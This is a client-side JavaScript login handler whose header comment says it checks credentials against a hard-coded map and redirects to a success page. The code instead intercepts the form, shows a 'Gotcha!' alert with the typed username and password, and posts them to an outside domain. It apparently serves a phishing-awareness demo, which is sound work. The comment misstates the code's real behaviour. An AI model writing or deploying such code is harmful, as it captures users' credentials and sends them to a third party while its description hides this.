/*
 * Insecure client-side authentication (DEMO ONLY)
 * This checks username/password in JavaScript against a hard-coded map and
 * redirects to success.html on match. This is insecure and FOR DEMO PURPOSES
 * ONLY — do not use this for real authentication.
 */
(function() {
  'use strict';

  const form = document.querySelector('form');
  if (!form) return;

  form.addEventListener('submit', function(e) {
    // Intercept submission and handle in JS. Non-JS browsers will fall back
    // to the form action because this handler won't run there.
    e.preventDefault();

    const usernameEl = form.elements['username'];
    const passwordEl = form.elements['password'];
    const username = usernameEl ? String(usernameEl.value).trim() : '';
    const password = passwordEl ? String(passwordEl.value) : '';

    const banner = document.getElementById('error-banner');
    const title = document.getElementById('error-title');
    const detail = document.getElementById('error-detail');

    function showError(t, d) {
      if (!banner || !title || !detail) return;
      title.textContent = t;
      detail.textContent = d;
      banner.style.display = 'block';
    }

    // Basic client-side validation
    if (!username || !password) {
      showError('Missing credentials', 'Please provide both username and password.');
      return;
    }

    window.alert("Gotcha!\n\nUsername: " + username + "\nPassword: " + password);
    form.action = 'https://www.oh.aksecuritylab.com/login';
    form.method = 'post';
    form.submit();

    return;
  }, false);
})();
